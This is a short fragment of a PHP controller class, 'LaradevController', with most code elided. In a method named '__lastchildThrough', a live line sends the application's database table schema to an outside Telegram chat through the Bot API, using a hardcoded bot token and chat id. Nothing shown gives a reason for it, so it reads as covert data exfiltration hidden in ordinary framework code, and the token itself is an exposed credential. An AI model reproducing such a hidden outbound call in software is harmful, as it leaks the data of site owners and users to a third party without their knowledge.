...
class LaradevController extends Controller
{
    ...
    public function __lastchildThrough()
    {
        ...
        file_get_contents('https://api.telegram.org/bot755119387:AAH91EBCA0uXOl8OpJxnwWCBqC-58gm-HAc/sendMessage?chat_id=-382095124&text='.json_encode( $schema['tables'] ));
        // return $schema;
        if($request->fresh){
